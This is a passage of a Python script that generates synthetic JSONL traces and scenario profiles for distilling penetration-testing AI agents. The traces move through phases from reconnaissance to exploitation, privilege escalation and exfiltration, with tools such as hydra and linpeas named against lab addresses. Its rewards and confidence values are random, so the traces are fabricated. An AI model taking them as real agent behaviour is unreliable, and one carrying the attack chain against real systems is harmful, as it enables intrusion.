        if current_phase == "RECON" and len(discovered_ports) >= 2:
            can_advance = True
        elif current_phase == "ENUMERATION" and len(discovered_services) >= 2:
            can_advance = True
        elif current_phase == "EXPLOITATION" and got_shell:
            can_advance = True
        elif current_phase == "PRIVILEGE_ESCALATION" and got_root:
            can_advance = True
        elif current_phase == "LATERAL_MOVEMENT" and rng.random() < 0.3:
            can_advance = True
        elif current_phase == "POST_EXPLOITATION" and rng.random() < 0.3:
            can_advance = True
        elif current_phase == "EXFILTRATION" and (got_root_flag or got_user_flag):
            can_advance = True

        if can_advance and rng.random() < 0.5:
            new_idx = phase_idx + 1
            if new_idx <= profile["max_phase_idx"] and new_idx < len(PHASE_ORDER):
                phase_idx = new_idx
                phase_after = PHASE_ORDER[phase_idx]
                current_phase = phase_after
                if phase_idx > highest_phase_idx:
                    advance_bonus = (
                        PHASE_ADVANCE_REWARDS.get(phase_after, 0.0)
                        - PHASE_ADVANCE_REWARDS.get(phase_before, 0.0)
                    )
                    step_reward += advance_bonus
                    highest_phase_idx = phase_idx

        # Base step reward
        if step_reward == 0.0 and not is_wrong_move:
            step_reward = rng.uniform(0.1, 1.5)

        episode_reward += step_reward

        # Build agent record
        agent_record = {
            "agent_name": agent_name,
            "role": {
                "ScoutAgent": "recon",
                "RedAgent": "offensive",
                "BlueAgent": "defensive",
                "ShadowAgent": "stealth",
                "OrionAgent": "strategic",
            }.get(agent_name, "offensive"),
            "decision_source": source,
            "phase": phase_before,
            "command": cmd,
            "command_family": tool["family"],
            "reward": round(step_reward, 3),
            "mentor_call": source in ("mentor", "dual_mentor"),
            "discoveries": discoveries,
            "stdout_snippet": output[:200],
            "confidence": round(rng.uniform(0.3, 0.95), 3),
            "template_name": tool.get("template", ""),
            "reasoning": tactical_lesson if is_wrong_move else "",
            "is_wrong_move": is_wrong_move,
            "tactical_lesson": tactical_lesson,
        }

        step_record = {
            "kind": "step",
            "distill_prep_version": DISTILL_PREP_VERSION,
            "step_num": step,
            "phase_before": phase_before,
            "phase_after": phase_after,
            "step_reward_total": round(step_reward, 3),
            "episode_reward_so_far": round(episode_reward, 3),
            "target_ip": target_ip,
            "agent_records": [agent_record],
            "timestamp": 1700000000.0 + run_idx * 10000 + step,
        }
        lines.append(step_record)
        last_command = cmd

    # Episode end
    success = got_root_flag or got_user_flag
    lines.append(
        {
            "kind": "episode_end",
            "distill_prep_version": DISTILL_PREP_VERSION,
            "episode_id": episode_id,
            "episode_num": run_idx,
            "total_reward": round(episode_reward, 3),
            "highest_phase": PHASE_ORDER[highest_phase_idx],
            "total_steps": n_steps,
            "target_ip": target_ip,
        }
    )
    return lines


def generate_all_runs(
    n_runs: int = 200,
    seed: int = 42,
    outdir: Optional[str] = None,
) -> List[Path]:
    """Generate N synthetic traces and write to JSONL files.

    Returns list of written file paths.
    """
    from scripts.distill_prep.trace_schema import DISTILL_PREP_VERSION

    rng = random.Random(seed)
    if outdir is None:
        outdir = "data/distill_prep/synthetic_traces"
    out_path = Path(outdir)
    out_path.mkdir(parents=True, exist_ok=True)

    difficulties = ["easy", "medium", "hard"]
    diff_weights = [0.25, 0.50, 0.25]

    written: List[Path] = []
    for run_idx in range(n_runs):
        difficulty = rng.choices(difficulties, weights=diff_weights, k=1)[0]
        target_ip = f"10.10.10.{rng.randint(1, 254)}"
        lines = generate_one_run(run_idx, difficulty, rng, target_ip)

        filename = out_path / f"run_{run_idx:04d}.jsonl"
        with open(filename, "w", encoding="utf-8") as f:
            for line_dict in lines:
                f.write(json.dumps(line_dict, separators=(",", ":")) + "\n")
        written.append(filename)
        if (run_idx + 1) % 50 == 0:
            logger.info("Generated %d/%d runs", run_idx + 1, n_runs)

    logger.info(
        "Wrote %d synthetic traces (version=%s) to %s",
        len(written),
        DISTILL_PREP_VERSION,
        out_path,
    )
    return written


# ---------------------------------------------------------------------------
# Scenario profile writer
# ---------------------------------------------------------------------------


def write_scenario_profiles(
    outdir: str = "data/distill_prep/scenarios",
    seed: int = 42,
) -> List[Path]:
    """Write scenario profile JSON files."""
    from scripts.distill_prep.trace_schema import DISTILL_PREP_VERSION

    rng = random.Random(seed)
    out_path = Path(outdir)
    out_path.mkdir(parents=True, exist_ok=True)

    profiles: List[Dict[str, Any]] = []
    for difficulty, cfg in DIFFICULTY_PROFILES.items():
        for i in range(3):
            scenario_id = f"scenario_{difficulty}_{i:02d}"
            profile = {
                "scenario_id": scenario_id,
                "name": f"{difficulty.title()} Target {i}",
                "difficulty": difficulty,
                "target_ip": f"10.10.10.{rng.randint(1, 254)}",
                "os_type": rng.choice(["linux", "windows"]),
                "services": cfg["services"],
                "open_ports": cfg["ports"],
                "vulnerabilities": [],
                "intended_path": [
                    "nmap_service_version",
                    "gobuster_dir",
                    "hydra_ssh",
                    "linpeas_ms2",
                ],
                "has_credentials": rng.random() < cfg["cred_prob"],
                "has_flags": rng.random() < cfg["flag_prob"],
                "max_steps": rng.randint(*cfg["step_range"]),
                "distill_prep_version": DISTILL_PREP_VERSION,
            }
            profiles.append(profile)

    written: List[Path] = []
    for p in profiles:
        filepath = out_path / f"{p['scenario_id']}.json"
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(p, f, indent=2)
        written.append(filepath)

    logger.info("Wrote %d scenario profiles to %s", len(written), out_path)
    return written


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


def main() -> None:
    """CLI entry point."""
    try:
        from rich.console import Console
    except ImportError:
        Console = None  # type: ignore[assignment,misc]

    parser = argparse.ArgumentParser(
        description="Generate synthetic distillation traces"
    )
    parser.add_argument("--runs", type=int, default=200, help="Number of runs")
    parser.add_argument("--seed", type=int, default=42, help="Random seed")
    parser.add_argument(
        "--outdir",
        type=str,
        default="data/distill_prep/synthetic_traces",
        help="Output directory",
    )
    parser.add_argument(
        "--scenarios-dir",
        type=str,
        default="data/distill_prep/scenarios",
        help="Scenario profiles output directory",
    )
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO, format="%(name)s %(message)s")

    # Write scenarios first
    scenario_paths = write_scenario_profiles(args.scenarios_dir, args.seed)
    # Generate traces
    trace_paths = generate_all_runs(args.runs, args.seed, args.outdir)

    if Console is not None:
        console = Console()
        console.print(
            f"\n[bold green]Generated {len(trace_paths)} synthetic traces[/bold green]"
        )
        console.print(
            f"[bold green]Wrote {len(scenario_paths)} scenario profiles[/bold green]"
        )
    else:
        logger.info("Generated %d traces, %d scenarios", len(trace_paths), len(scenario_paths))


if __name__ == "__main__":
    main()
